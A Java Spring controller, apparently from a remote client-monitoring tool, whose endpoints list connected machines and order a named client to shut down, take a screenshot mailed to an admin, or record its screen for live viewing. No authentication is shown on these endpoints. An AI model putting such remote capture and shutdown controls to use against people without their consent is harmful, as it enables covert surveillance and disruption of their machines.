package org.mm.controller;

import java.io.IOException;

import javax.annotation.Resource;
import org.mm.java.WebSocket;
import org.mm.server.*;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.*;
@Controller
@ContextConfiguration(locations = {"classpath:applicationContext.xml"})
public class WebControl {
	
	private  WebSocket webSocket;
	@Resource 
	public void setWebSocket(WebSocket webSocket) {
		this.webSocket = webSocket;
	}
	
	/*
	 * 列出所有已连接的用户机 
	 */
	@RequestMapping(value = "list")
	public String getAllBlog(ModelMap modelMap)
			throws Exception{
        modelMap.addAttribute("clientList", webSocket.RequestClientIP());
        return "list";
	}
	/* 
	 * 关闭指定的用户机 
	 */
	@RequestMapping(value = "shutdown/{client}")
	public String close(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("shutdown\n\n");
		return "result";
	}
	/* 
	 * 指定用户机截图,发到管理邮箱
	 */
	@RequestMapping(value = "screen/{client}")
	public String screen(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("screenshot\n\n");
		return "result";
	}
	/* 
	 * 录屏播放
	 */
	@RequestMapping(value = "recording/{client}")
	public String recording(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("recording\n\n");
		return "online";
	}
	/* 
	 * 返回图像的二进制流,用于录屏播放
	 */
	@RequestMapping(value = "recording/live")
	@ResponseBody
	public ResponseEntity<byte[]> live( ) throws IOException {
	    HttpHeaders headers = new HttpHeaders();  
	    headers.setContentType(MediaType.IMAGE_JPEG); 
	    byte[] res = null;
	    if( (res = Recording.getImage()) != null)
	    	return new ResponseEntity<byte[]>(res, headers, HttpStatus.OK);
		return new ResponseEntity<byte[]>(res, headers, HttpStatus.NOT_FOUND); 
	}
}
